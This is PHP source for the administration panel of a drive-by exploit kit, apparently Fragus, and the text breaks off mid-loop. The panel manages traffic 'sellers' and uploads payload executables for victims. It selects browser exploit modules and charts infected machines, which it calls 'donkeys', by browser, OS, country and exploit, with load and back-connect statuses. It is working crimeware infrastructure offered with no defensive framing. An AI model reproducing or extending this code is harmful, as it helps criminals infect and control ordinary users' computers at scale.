<?php

//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
$_Errors = array();
$_Messages = array();

//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
include("./secure/config.php");
session_start();


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
if (!isset($_SESSION['language'])){
	$_SESSION['language'] = $config['AdminDefaultLanguage'];
}
if (isset($_POST['language'])){
	$_SESSION['language'] = str_replace("\\", "", str_replace("/", "", str_replace(".", "", $_POST['language'])));
}


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
if (isset($_POST['auth'])){
	if ((isset($_POST['login']) AND $_POST['login'] == $config['AdminLogin']) AND (isset($_POST['password']) AND md5($_POST['password']) == $config['AdminPassword'])){
		$_SESSION['auth'] = TRUE;
		header("Location: " . $_SERVER['PHP_SELF']);
		exit();
	} else {
		$_Errors['FailsLogin'] = TRUE;
	}
}


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
if (empty($_SESSION['auth'])){
	$langoptions = "";
	$langdir = scandir("./secure/templates");
	for ($i = 0; $i < count($langdir); $i++){
		if ($langdir[$i] != "." AND $langdir[$i] != ".." AND substr(strtolower($langdir[$i]), -4) != ".php"){
			if (isset($_POST['language']) AND $_POST['language'] == $langdir[$i]){
				$langoptions .= "<option value='" . $langdir[$i] . "' selected>" . ucfirst($langdir[$i]) . "</option>";
			} elseif (!isset($_POST['language']) AND $config['AdminDefaultLanguage'] == $langdir[$i]){
				$langoptions .= "<option value='" . $langdir[$i] . "' selected>" . ucfirst($langdir[$i]) . "</option>";
			} else {
				$langoptions .= "<option value='" . $langdir[$i] . "'>" . ucfirst($langdir[$i]) . "</option>";
			}
		}
	}
	include("./secure/templates/" . $_SESSION['language'] . "/admin_login.php");
	exit();
}


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
mysql_connect($config['MysqlHost'], $config['MysqlUser'], $config['MysqlPassword']) or die("Could not connect to mysql server.");
mysql_select_db($config['MysqlDbname']) or die("Could not select database.");


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
$globalstat = mysql_fetch_array(mysql_query("SELECT SUM(1) AS `all`, SUM(`status` <> 'NOT') AS `frags` FROM `donkeys`"));
if (strlen($globalstat['all']) < 1){
	$globalstat['all'] = 0;
	$globalstat['frags'] = 0;
}
if (isset($_GET['get_ajax']) AND $_GET['get_ajax'] == "1"){
	echo $globalstat['all'] . "|" . $globalstat['frags'];
	exit();
}


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
if (isset($_GET['c']) AND $_GET['c'] == "logout"){
	session_destroy();
	header("Location: " . $_SERVER['PHP_SELF']);
	exit();


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
} elseif (isset($_GET['c']) AND $_GET['c'] == "trafficlinks"){
	include("./secure/javascript.php");
	$sellerhash = "";
	$selleroptions = "";
	$result = mysql_query("SELECT `id`, `name`, `hash` FROM `sellers` ORDER BY `id` ASC");
	while ($row = mysql_fetch_array($result)){
		$selleroptions .= "<option value='" . $row['id'] . "'" . ((isset($_GET['seller_id']) AND $_GET['seller_id'] == $row['id']) ? " selected" : "") . ">" . $row['name'] . "</option>";
		if (isset($_GET['seller_id']) AND $_GET['seller_id'] != '0' AND $_GET['seller_id'] == $row['id']){
			$sellerhash = "?s=" . $row['hash'];
		}
	}
	include("./secure/templates/" . $_SESSION['language'] . "/admin_trafficlinks.php");


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
} elseif (isset($_GET['c']) AND $_GET['c'] == "sellers"){

	///////
	if (isset($_GET['edit_id']) AND intval($_GET['edit_id']) > 0){
		if (isset($_POST['action']) AND $_POST['action'] == "edit"){
			mysql_query("UPDATE `sellers` SET `name` = '" . mysql_real_escape_string((strlen($_POST['name']) > 0) ? $_POST['name'] : "noname") . "', `file` = " . intval($_POST['file']) . ", `exploits` = '" . mysql_real_escape_string(serialize(isset($_POST['exploits']) ? $_POST['exploits'] : array())) . "' WHERE `id` = " . intval($_GET['edit_id']));
			header("Location: " . $_SERVER['PHP_SELF'] . "?c=sellers");
			exit();
		}
		if ($row = mysql_fetch_array(mysql_query("SELECT * FROM `sellers` WHERE `id` = " . intval($_GET['edit_id'])))){
			$seller['id'] = $row['id'];
			$seller['name'] = $row['name'];
			$seller['files'] = "";
			$result = mysql_query("SELECT `id`, `description` FROM `files`");
			while ($frow = mysql_fetch_array($result)){
				$seller['files'] .= "<option value='" . $frow['id'] . "'" . (($frow['id'] == $row['file']) ? " selected" : "") . ">" . $frow['description'] . "</option>";
			}
			$seller['exploits'] = "";
			$exp_default = unserialize($row['exploits']);
			$exploitsdir = scandir("./secure/exploits");
			for ($i = 0; $i < count($exploitsdir); $i++){
				if ($exploitsdir[$i] != "." AND $exploitsdir[$i] != ".."){
					list($name) = explode(".", $exploitsdir[$i]);
					list(,$tmpname) = explode("-", $name);
					$seller['exploits'] .= "<tr><td><input type='checkbox' id='exp" . $i . "' name='exploits[]' value='" . $name . "'" . (in_array($name, $exp_default) ? " checked" : "") . "></td><td><label for='exp" . $i . "'>" . $tmpname . "</label></td></tr>";
				}
			}
		}
	}

	///////
	if (isset($_GET['delete_id']) AND intval($_GET['delete_id']) > 0){
		mysql_query("DELETE FROM `donkeys` WHERE `seller` = " . intval($_GET['delete_id']) . "");
		mysql_query("DELETE FROM `sellers` WHERE `id` = " . intval($_GET['delete_id']) . "");
		header("Location: " . $_SERVER['PHP_SELF'] . "?c=sellers");
		exit();
	}

	///////
	if (isset($_GET['clear_id']) AND intval($_GET['clear_id']) > 0){
		mysql_query("DELETE FROM `donkeys` WHERE `seller` = " . intval($_GET['clear_id']) . "");
		header("Location: " . $_SERVER['PHP_SELF'] . "?c=sellers");
		exit();
	}

	///////
	if (isset($_POST['action']) AND $_POST['action'] == "add"){
		mysql_query("INSERT INTO `sellers` (`name`, `hash`, `file`, `exploits`) VALUES ('" . mysql_real_escape_string((strlen($_POST['name']) > 0) ? $_POST['name'] : "noname") . "', '" . substr(md5(rand() . time()), 0, 10) . "', " . intval($_POST['file']) . ", '" . mysql_real_escape_string(serialize(isset($_POST['exploits']) ? $_POST['exploits'] : array())) . "')");
		$_Messages['SellerAdded'] = TRUE;
	}

	///////
	$files = "";
	$result = mysql_query("SELECT `id`, `description` FROM `files`");
	while ($row = mysql_fetch_array($result)){
		$files .= "<option value='" . $row['id'] . "'>" . $row['description'] . "</option>";
	}

	///////
	$exploits = "";
	$exp_default = unserialize($config['Exploits']);
	$exploitsdir = scandir("./secure/exploits");
	for ($i = 0; $i < count($exploitsdir); $i++){
		if ($exploitsdir[$i] != "." AND $exploitsdir[$i] != ".."){
			list($name) = explode(".", $exploitsdir[$i]);
			list(,$tmpname) = explode("-", $name);
			$exploits .= "<tr><td><input type='checkbox' id='exp" . $i . "' name='exploits[]' value='" . $name . "'" . (@in_array($name, $exp_default) ? " checked" : "") . "></td><td><label for='exp" . $i . "'>" . $tmpname . "</label></td></tr>";
		}
	}

	///////
	$sellers = array();
	$i = 0;
	$result = mysql_query("SELECT `sellers`.`id` AS `id`, `sellers`.`name` AS `name`, `sellers`.`hash` AS `hash`, `files`.`description` AS `file`, `sellers`.`exploits` AS `exploits`, (SELECT SUM(1) FROM `donkeys` WHERE `donkeys`.`seller` = `sellers`.`id`) AS `hosts`, (SELECT SUM(`donkeys`.`status` = 'LOAD' OR `donkeys`.`status` = 'BACKCONNECT') FROM `donkeys` WHERE `donkeys`.`seller` = `sellers`.`id`) AS `frags` FROM `sellers` LEFT JOIN `files` ON `files`.`id` = `sellers`.`file` ORDER BY `sellers`.`id` ASC");
	while ($row = mysql_fetch_array($result)){
		$sellers[$i]['id'] = $row['id'];
		$sellers[$i]['name'] = $row['name'];
		$sellers[$i]['hash'] = $row['hash'];
		$sellers[$i]['file'] = $row['file'];
		$sellers[$i]['exploits'] = unserialize($row['exploits']);
		for ($z = 0; $z < count($sellers[$i]['exploits']); $z++){
			list(,$tmpname) = explode("-", $sellers[$i]['exploits'][$z]);
			$sellers[$i]['exploits'][$z] = $tmpname;
		}
		$sellers[$i]['hosts'] = $row['hosts'] * 1;
		$sellers[$i]['frags'] = $row['frags'] * 1;
		$i++;
	}
	include("./secure/templates/" . $_SESSION['language'] . "/admin_sellers.php");



//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
} elseif (isset($_GET['c']) AND $_GET['c'] == "files"){

	///////
	if (isset($_GET['edit_id']) AND intval($_GET['edit_id']) > 0){
		if (isset($_POST['action']) AND $_POST['action'] == "edit"){
			mysql_query("UPDATE `files` SET `name` = '" . mysql_real_escape_string((strlen($_POST['name']) > 0) ? $_POST['name'] : "noname.exe") . "', `description` = '" . mysql_real_escape_string((strlen($_POST['description']) > 0) ? $_POST['description'] : "nodescription") . "' WHERE `id` = " . intval($_GET['edit_id']));
			if ($_FILES['filedata']['error'] == "0"){
				move_uploaded_file($_FILES['filedata']['tmp_name'], "./secure/files/" . intval($_GET['edit_id']));
			}
			header("Location: " . $_SERVER['PHP_SELF'] . "?c=files");
			exit();
		}
		if ($row = mysql_fetch_array(mysql_query("SELECT * FROM `files` WHERE `id` = " . intval($_GET['edit_id'])))){
			$file['id'] = $row['id'];
			$file['name'] = $row['name'];
			$file['description'] = $row['description'];
		}
	}

	///////
	if (isset($_POST['action']) AND $_POST['action'] == "add"){
		if ($_FILES['filedata']['error'] == "0"){
			mysql_query("INSERT INTO `files` (`name`, `description`) VALUES ('" . mysql_real_escape_string((strlen($_POST['name']) > 0) ? $_POST['name'] : "noname.exe") . "', '" . mysql_real_escape_string((strlen($_POST['description']) > 0) ? $_POST['description'] : "nodescription") . "')");
			move_uploaded_file($_FILES['filedata']['tmp_name'], "./secure/files/" . mysql_insert_id());
			$_Messages['FileAdded'] = TRUE;
		} else {
			$_Messages['FileNoAdded'] = TRUE;
		}
	}

	///////
	if (isset($_GET['delete_id']) AND intval($_GET['delete_id']) > 0){
		mysql_query("DELETE FROM `files` WHERE `id` = " . intval($_GET['delete_id']) . "");
		mysql_query("UPDATE `sellers` SET `file` = 0 WHERE `file` = " . intval($_GET['delete_id']));
		@unlink("./secure/files/" . intval($_GET['delete_id']));
		header("Location: " . $_SERVER['PHP_SELF'] . "?c=files");
		exit();
	}

	///////
	$files = array();
	$i = 0;
	$result = mysql_query("SELECT `files`.`id` AS `id`, `files`.`name` AS `name`, `files`.`description` AS `description`, (SELECT SUM(`donkeys`.`status` = 'LOAD' OR `donkeys`.`status` = 'BACKCONNECT') FROM `donkeys` WHERE `donkeys`.`file` = `files`.`id`) AS `frags`, (SELECT SUM(`donkeys`.`status` = 'BACKCONNECT') FROM `donkeys` WHERE `donkeys`.`file` = `files`.`id`) AS `backconnects` FROM `files` ORDER BY `files`.`id` ASC");
	while ($row = mysql_fetch_array($result)){
		$files[$i]['id'] = $row['id'];
		$files[$i]['name'] = $row['name'];
		$files[$i]['description'] = $row['description'];
		$files[$i]['backconnects'] = $row['backconnects'] * 1;
		$files[$i]['frags'] = $row['frags'] * 1;
		$i++;
	}
	include("./secure/templates/" . $_SESSION['language'] . "/admin_files.php");


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
} elseif (isset($_GET['c']) AND $_GET['c'] == "preferences"){

	///////
	if (isset($_POST['action']) AND $_POST['action'] == "save"){
		file_put_contents("./secure/config.php", "<?php

\$config['FragusVersion'] = \"" . $config['FragusVersion'] . "\";
\$config['CryptSignature'] = \"" . $config['CryptSignature'] . "\";

\$config['MysqlHost'] = \"" . $config['MysqlHost'] . "\";
\$config['MysqlUser'] = \"" . $config['MysqlUser'] . "\";
\$config['MysqlPassword'] = \"" . $config['MysqlPassword'] . "\";
\$config['MysqlDbname'] = \"" . $config['MysqlDbname'] . "\";

\$config['AdminLogin'] = \"" . addslashes(trim($_POST['conf_login'])) . "\";
\$config['AdminPassword'] = \"" . ((strlen(trim($_POST['conf_pass'])) > 0) ? md5($_POST['conf_pass']) : $config['AdminPassword']) . "\";
\$config['AdminDefaultLanguage'] = \"" . addslashes(trim($_POST['conf_language'])) . "\";
\$config['AdminAjaxSeconds'] = " . intval($_POST['conf_ajaxseconds']) . ";
\$config['UrlToFolder'] = \"" . addslashes(trim($_POST['conf_url'])) . "\";
\$config['FinishRedirect'] = \"" . addslashes(trim($_POST['conf_finishurl'])) . "\";
\$config['DoubleIpRedirect'] = \"" . addslashes(trim($_POST['conf_doubleurl'])) . "\";
\$config['AjaxCheckBeforeExploit'] = " . (($_POST['conf_ajaxcheck'] == 1) ? 'TRUE' : 'FALSE') . ";
\$config['DefaultFile'] = \"" . intval($_POST['conf_defaultfile']) . "\";
\$config['Exploits'] = '" . serialize(isset($_POST['exploits']) ? $_POST['exploits'] : array()) . "';

?>");
		$config['AdminLogin'] = trim($_POST['conf_login']);
		$config['AdminDefaultLanguage'] = trim($_POST['conf_language']);
		$config['AdminAjaxSeconds'] = intval($_POST['conf_ajaxseconds']);
		$config['UrlToFolder'] = trim($_POST['conf_url']);
		$config['FinishRedirect'] = trim($_POST['conf_finishurl']);
		$config['DoubleIpRedirect'] = trim($_POST['conf_doubleurl']);
		$config['AjaxCheckBeforeExploit'] = ($_POST['conf_ajaxcheck'] == 1) ? TRUE : FALSE;
		$config['DefaultFile'] = intval($_POST['conf_defaultfile']);
		$config['Exploits'] =serialize(isset($_POST['exploits']) ? $_POST['exploits'] : array());
	}


	///////
	$langoptions = "";
	$langdir = scandir("./secure/templates");
	for ($i = 0; $i < count($langdir); $i++){
		if ($langdir[$i] != "." AND $langdir[$i] != ".." AND substr(strtolower($langdir[$i]), -4) != ".php"){
			if ($config['AdminDefaultLanguage'] == $langdir[$i]){
				$langoptions .= "<option value='" . $langdir[$i] . "' selected>" . ucfirst($langdir[$i]) . "</option>";
			} else {
				$langoptions .= "<option value='" . $langdir[$i] . "'>" . ucfirst($langdir[$i]) . "</option>";
			}
		}
	}

	///////
	$fileslist = "";
	if ($row = mysql_fetch_array(mysql_query("SELECT `id`, `description` FROM `files`"))){
		$fileslist .= "<option value='" . $row['id'] . "'" . (($config['DefaultFile'] == $row['id']) ? ' selected' : ''). ">" . $row['description'] . "</option>";
	}

	///////
	$exploits = "";
	$exp_default = unserialize($config['Exploits']);
	$exploitsdir = scandir("./secure/exploits");
	for ($i = 0; $i < count($exploitsdir); $i++){
		if ($exploitsdir[$i] != "." AND $exploitsdir[$i] != ".."){
			list($name) = explode(".", $exploitsdir[$i]);
			list(,$tmpname) = explode("-", $name);
			($i%2 == 0) ? ($exploits .= '</tr><tr>') : '';
			$exploits .= "<td width='50%'><table><tr><td><input type='checkbox' id='exp" . $i . "' name='exploits[]' value='" . $name . "'" . (@in_array($name, $exp_default) ? " checked" : "") . "></td><td><label for='exp" . $i . "'>" . $tmpname . "</label></td></tr></table></td>";
		}
	}

	include("./secure/templates/" . $_SESSION['language'] . "/admin_preferences.php");


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
} else {

	///////
	if (isset($_GET['clear_db']) AND $_GET['clear_db'] == "1"){
		mysql_query("TRUNCATE TABLE `donkeys`");
		header("Location: " . $_SERVER['PHP_SELF']);
		exit();
	}

	///////
	include("./secure/geoip.php");
	$gi = new GeoIP;

	///////
	if (isset($_GET['img']) AND $_GET['img'] == "exploits"){
		include("./secure/pchart.php");
		$explarray = array();
		$exploitsdir = scandir("./secure/exploits");
		for ($i = 0; $i < count($exploitsdir); $i++){
			if ($exploitsdir[$i] != "." AND $exploitsdir[$i] != ".."){
				list($name) = explode(".", $exploitsdir[$i]);
				list($id, $namee) = explode("-", $name);
				$explarray[$id] = $namee;
			}
		}
		$result = mysql_query("SELECT `exploit`, SUM(1) AS `all`, SUM(`status` = 'BACKCONNECT') AS `loaded` FROM `donkeys` WHERE `status` <> 'NOT'" . ((isset($_GET['seller_id']) AND $_GET['seller_id'] != '0') ? " AND `seller` = '" . intval($_GET['seller_id']) . "'" : "") . " GROUP BY `exploit` ORDER BY `loaded` DESC, `all` DESC LIMIT 6");
		$browsers = array();
		$sum_all = array();
		$sum_frags = array();
		while ($row = mysql_fetch_array($result)){
			$sum_all[] = $row['all'];
			$sum_frags[] = $row['loaded'];
			$browsers[] = ($row['exploit'] == 0) ? "OTHER" : $explarray[$row['exploit']];
		}

		$DataSet = new pData;
		if (count($browsers) > 0){
			$DataSet->AddPoint($sum_all,"Serie1");
			$DataSet->AddPoint($sum_frags,"Serie2");
			$DataSet->AddPoint($browsers,"Serie3");
		} else {
			$DataSet->AddPoint(array(0),"Serie1");
			$DataSet->AddPoint(array(0),"Serie2");
			$DataSet->AddPoint(array("Data is empty"),"Serie3");
		}
		$DataSet->AddAllSeries();
		$DataSet->SetAbsciseLabelSerie();
		$DataSet->SetSerieName("Frags","Serie1");
		$DataSet->SetSerieName("Feedback","Serie2");
		$DataSet->SetAbsciseLabelSerie("Serie3");
		$Test = new pChart(480,180);
		$Test->setFontProperties("./secure/tahoma.ttf",8);
		$Test->setGraphArea(55,20,385,150);
		$Test->drawFilledRoundedRectangle(7,7,473,173,5,240,240,240);
		$Test->drawRoundedRectangle(5,5,475,175,5,230,230,230);
		$Test->drawGraphArea(255,255,255,TRUE);
		$Test->drawScale($DataSet->GetData(),$DataSet->GetDataDescription(),SCALE_START0,150,150,150,TRUE,0,2,TRUE);
		$Test->drawGrid(4,TRUE,230,230,230,50);
		$DataSet->RemoveSerie("Serie3");
		$Test->setFontProperties("./secure/tahoma.ttf",6);
		$Test->drawTreshold(0,143,55,72,TRUE,TRUE);
		$Test->drawOverlayBarGraph($DataSet->GetData(),$DataSet->GetDataDescription());
		$Test->setFontProperties("./secure/tahoma.ttf",8);
		$Test->drawLegend(395,20,$DataSet->GetDataDescription(),255,255,255);
		$Test->Render("./secure/files/exploits.png");
		header("Content-type: image/png");
		echo file_get_contents("./secure/files/exploits.png");
		unlink("./secure/files/exploits.png");
		exit();
	}

	///////
	if (isset($_GET['img']) AND $_GET['img'] == "os"){
		include("./secure/pchart.php");
		$result = mysql_query("SELECT `os`, SUM(1) AS `all`, SUM(`status` = 'LOAD' OR `status` = 'BACKCONNECT') AS `loaded` FROM `donkeys`" . ((isset($_GET['seller_id']) AND $_GET['seller_id'] != '0') ? " WHERE `seller` = '" . intval($_GET['seller_id']) . "'" : "") . " GROUP BY `os` ORDER BY `loaded` DESC, `all` DESC LIMIT 8");
		$browsers = array();
		$sum_all = array();
		$sum_frags = array();
		while ($row = mysql_fetch_array($result)){
			$sum_all[] = $row['all'];
			$sum_frags[] = $row['loaded'];
			if ($row['os'] == "95" OR $row['os'] == "98" OR $row['os'] == "2000" OR $row['os'] == "2003"){
				$browsers[] = chr(160) . $row['os'];
			} else {
				$browsers[] = $row['os'];
			}
		}
		$DataSet = new pData;
		if (count($browsers) > 0){
			$DataSet->AddPoint($sum_all,"Serie1");
			$DataSet->AddPoint($sum_frags,"Serie2");
			$DataSet->AddPoint($browsers,"Serie3");
		} else {
			$DataSet->AddPoint(array(0),"Serie1");
			$DataSet->AddPoint(array(0),"Serie2");
			$DataSet->AddPoint(array("Data is empty"),"Serie3");
		}
		$DataSet->AddAllSeries();
		$DataSet->SetAbsciseLabelSerie();
		$DataSet->SetSerieName("All","Serie1");
		$DataSet->SetSerieName("Frags","Serie2");
		$DataSet->SetAbsciseLabelSerie("Serie3");
		$Test = new pChart(480,180);
		$Test->setFontProperties("./secure/tahoma.ttf",8);
		$Test->setGraphArea(55,20,385,150);
		$Test->drawFilledRoundedRectangle(7,7,473,173,5,240,240,240);
		$Test->drawRoundedRectangle(5,5,475,175,5,230,230,230);
		$Test->drawGraphArea(255,255,255,TRUE);
		$Test->drawScale($DataSet->GetData(),$DataSet->GetDataDescription(),SCALE_START0,150,150,150,TRUE,0,2,TRUE);
		$Test->drawGrid(4,TRUE,230,230,230,50);
		$DataSet->RemoveSerie("Serie3");
		$Test->setFontProperties("./secure/tahoma.ttf",6);
		$Test->drawTreshold(0,143,55,72,TRUE,TRUE);
		$Test->drawOverlayBarGraph($DataSet->GetData(),$DataSet->GetDataDescription());
		$Test->setFontProperties("./secure/tahoma.ttf",8);
		$Test->drawLegend(400,20,$DataSet->GetDataDescription(),255,255,255);
		$Test->Render("./secure/files/os.png");
		header("Content-type: image/png");
		echo file_get_contents("./secure/files/os.png");
		unlink("./secure/files/os.png");
		exit();
	}

	///////
	if (isset($_GET['img']) AND $_GET['img'] == "browsers"){
		include("./secure/pchart.php");
		$result = mysql_query("SELECT `browser`, SUM(1) AS `all`, SUM(`status` = 'LOAD' OR `status` = 'BACKCONNECT') AS `loaded` FROM `donkeys`" . ((isset($_GET['seller_id']) AND $_GET['seller_id'] != '0') ? " WHERE `seller` = '" . intval($_GET['seller_id']) . "'" : "") . " GROUP BY `browser` ORDER BY `loaded` DESC, `all` DESC");
		$browsers = array();
		$sum_all = array();
		$sum_frags = array();
		while ($row = mysql_fetch_array($result)){
			$sum_all[] = $row['all'];
			$sum_frags[] = $row['loaded'];
			$browsers[] = $row['browser'];
		}
		$DataSet = new pData;
		if (count($browsers) > 0){
			$DataSet->AddPoint($sum_all,"Serie1");
			$DataSet->AddPoint($sum_frags,"Serie2");
			$DataSet->AddPoint($browsers,"Serie3");
		} else {
			$DataSet->AddPoint(array(0),"Serie1");
			$DataSet->AddPoint(array(0),"Serie2");
			$DataSet->AddPoint(array("Data is empty"),"Serie3");
		}
		$DataSet->AddAllSeries();
		$DataSet->SetAbsciseLabelSerie();
		$DataSet->SetSerieName("All","Serie1");
		$DataSet->SetSerieName("Frags","Serie2");
		$DataSet->SetAbsciseLabelSerie("Serie3");
		$Test = new pChart(480,180);
		$Test->setFontProperties("./secure/tahoma.ttf",8);
		$Test->setGraphArea(55,20,385,150);
		$Test->drawFilledRoundedRectangle(7,7,473,173,5,240,240,240);
		$Test->drawRoundedRectangle(5,5,475,175,5,230,230,230);
		$Test->drawGraphArea(255,255,255,TRUE);
		$Test->drawScale($DataSet->GetData(),$DataSet->GetDataDescription(),SCALE_START0,150,150,150,TRUE,0,2,TRUE);
		$Test->drawGrid(4,TRUE,230,230,230,50);
		$DataSet->RemoveSerie("Serie3");
		$Test->setFontProperties("./secure/tahoma.ttf",6);
		$Test->drawTreshold(0,143,55,72,TRUE,TRUE);
		$Test->drawOverlayBarGraph($DataSet->GetData(),$DataSet->GetDataDescription());
		$Test->setFontProperties("./secure/tahoma.ttf",8);
		$Test->drawLegend(400,20,$DataSet->GetDataDescription(),255,255,255);
		$Test->Render("./secure/files/browsers.png");
		header("Content-type: image/png");
		echo file_get_contents("./secure/files/browsers.png");
		unlink("./secure/files/browsers.png");
		exit();
	}

	///////
	if (isset($_GET['img']) AND $_GET['img'] == "country"){
		include("./secure/pchart.php");
		$result = mysql_query("SELECT `country`, SUM(1) AS `all`, SUM(`status` = 'LOAD' OR `status` = 'BACKCONNECT') AS `loaded` FROM `donkeys`" . ((isset($_GET['seller_id']) AND $_GET['seller_id'] != '0') ? " WHERE `seller` = '" . intval($_GET['seller_id']) . "'" : "") . " GROUP BY `country` ORDER BY `loaded` DESC, `all` DESC LIMIT 10");
		$countrys = array();
		$sum_all = array();
		$sum_frags = array();
		while ($row = mysql_fetch_array($result)){
			$sum_all[] = $row['all'];
			$sum_frags[] = $row['loaded'];
			$countrys[] = ($row['country'] == 0) ? "??" : $gi->GEOIP_COUNTRY_CODES[$row['country']];
		}
		$DataSet = new pData;
		if (count($countrys) > 0){
			$DataSet->AddPoint($sum_all,"Serie1");
			$DataSet->AddPoint($sum_frags,"Serie2");
			$DataSet->AddPoint($countrys,"Serie3");
		} else {
			$DataSet->AddPoint(array(0),"Serie1");
			$DataSet->AddPoint(array(0),"Serie2");
			$DataSet->AddPoint(array("Data is empty"),"Serie3");
		}
		$DataSet->AddAllSeries();
		$DataSet->SetAbsciseLabelSerie();
		$DataSet->SetSerieName("All","Serie1");
		$DataSet->SetSerieName("Frags","Serie2");
		$DataSet->SetAbsciseLabelSerie("Serie3");
		$Test = new pChart(480,180);
		$Test->setFontProperties("./secure/tahoma.ttf",8);
		$Test->setGraphArea(55,20,385,150);
		$Test->drawFilledRoundedRectangle(7,7,473,173,5,240,240,240);
		$Test->drawRoundedRectangle(5,5,475,175,5,230,230,230);
		$Test->drawGraphArea(255,255,255,TRUE);
		$Test->drawScale($DataSet->GetData(),$DataSet->GetDataDescription(),SCALE_START0,150,150,150,TRUE,0,2,TRUE);
		$Test->drawGrid(4,TRUE,230,230,230,50);
		$DataSet->RemoveSerie("Serie3");
		$Test->setFontProperties("./secure/tahoma.ttf",6);
		$Test->drawTreshold(0,143,55,72,TRUE,TRUE);
		$Test->drawOverlayBarGraph($DataSet->GetData(),$DataSet->GetDataDescription());
		$Test->setFontProperties("./secure/tahoma.ttf",8);
		$Test->drawLegend(400,20,$DataSet->GetDataDescription(),255,255,255);
		$Test->Render("./secure/files/country.png");
		header("Content-type: image/png");
		echo file_get_contents("./secure/files/country.png");
		unlink("./secure/files/country.png");
		exit();
	}

	///////
	$selleroptions = "";
	$result = mysql_query("SELECT `id`, `name` FROM `sellers` ORDER BY `id` ASC");
	while ($row = mysql_fetch_array($result)){
		$selleroptions .= "<option value='" . $row['id'] . "'" . ((isset($_GET['seller_id']) AND $_GET['seller_id'] == $row['id']) ? " selected" : "") . ">" . $row['name'] . "</option>";
	}

	///////
	$result = mysql_query("SELECT `browser`, SUM(1) AS `all`, SUM(`status` = 'LOAD' OR `status` = 'BACKCONNECT') AS `loaded` FROM `donkeys`" . ((isset($_GET['seller_id']) AND $_GET['seller_id'] != '0') ? " WHERE `seller` = '" . intval($_GET['seller_id']) . "'" : "") . " GROUP BY `browser` ORDER BY `loaded` DESC, `all` DESC");
	$browsers = array();
	$browsers['browser'] = array();
	$browsers_versions = array();
	$i = 0;
	while ($row = mysql_fetch_array($result)){
		$browsers['browser'][$i] = $row['browser'];
		$browsers['all'][$i] = $row['all'];
		$browsers['frags'][$i] = $row['loaded'];
		$z = 0;
		$result2 = mysql_query("SELECT `browser_version` AS `version`, SUM(1) AS `sum`, SUM(`status` = 'LOAD' OR `status` = 'BACKCONNECT') AS `frags` FROM `donkeys` WHERE `browser` = '" . $row['browser'] . "'" . ((isset($_GET['seller_id']) AND $_GET['seller_id'] != '0') ? " AND `seller` = '" . intval($_GET['seller_id']) . "'" : "") . " GROUP BY `browser_version` ORDER BY `frags` DESC, `sum` DESC LIMIT 10");
		while ($row2 = mysql_fetch_array($result2)){
			$browsers_versions[$row['browser']]['version'][$z] = $row2['version'];
			$browsers_versions[$row['browser']]['sum'][$z] = $row2['sum'];
			$browsers_versions[$row['browser']]['frags'][$z] = $row2['frags'];
			$z++;
		}
		$i++;
	}

	///////
	$result = mysql_query("SELECT `os`, SUM(1) AS `all`, SUM(`status` = 'LOAD' OR `status` = 'BACKCONNECT') AS `loaded` FROM `donkeys`" . ((isset($_GET['seller_id']) AND $_GET['seller_id'] != '0') ? " WHERE `seller` = '" . intval($_GET['seller_id']) . "'" : "") . " GROUP BY `os` ORDER BY `loaded` DESC, `all` DESC");
	$oss = array();
	$oss['os'] = array();
	$oss_versions = array();
	$i = 0;
	while ($row = mysql_fetch_array($result)){
		$oss['os'][$i] = $row['os'];
		$oss['all'][$i] = $row['all'];
		$oss['frags'][$i] = $row['loaded'];
		$z = 0;
		$result2 = mysql_query("SELECT `os_version` AS `version`, SUM(1) AS `sum`, SUM(`status` = 'LOAD' OR `status` = 'BACKCONNECT') AS `frags` FROM `donkeys` WHERE `os` = '" . $row['os'] . "'" . ((isset($_GET['seller_id']) AND $_GET['seller_id'] != '0') ? " AND `seller` = '" . intval($_GET['seller_id']) . "'" : "") . " GROUP BY `os_version` ORDER BY `frags` DESC LIMIT 10");
		while ($row2 = mysql_fetch_array($result2)){
			$oss_versions[$row['os']]['version'][$z] = $row2['version'];
			$oss_versions[$row['os']]['sum'][$z] = $row2['sum'];
			$oss_versions[$row['os']]['frags'][$z] = $row2['frags'];
			$z++;
		}
		$i++;
	}

	///////
	$result = mysql_query("SELECT `country`, SUM(1) AS `all`, SUM(`status` = 'LOAD' OR `status` = 'BACKCONNECT') AS `loaded` FROM `donkeys`" . ((isset($_GET['seller_id']) AND $_GET['seller_id'] != '0') ? " WHERE `seller` = '" . intval($_GET['seller_id']) . "'" : "") . " GROUP BY `country` ORDER BY `loaded` DESC, `all` DESC LIMIT 10");
	$countrys = array();
	$countrys['country'] = array();
	$i = 0;
	while ($row = mysql_fetch_array($result)){
		$countrys['country'][$i] = $row['country'];
		$countrys['all'][$i] = $row['all'];
		$countrys['frags'][$i] = $row['loaded'];
		$i++;
	}

	///////
	$explarray = array();
	$exploitsdir = scandir("./secure/exploits");
	for ($i = 0; $i < count($exploitsdir); $i++){
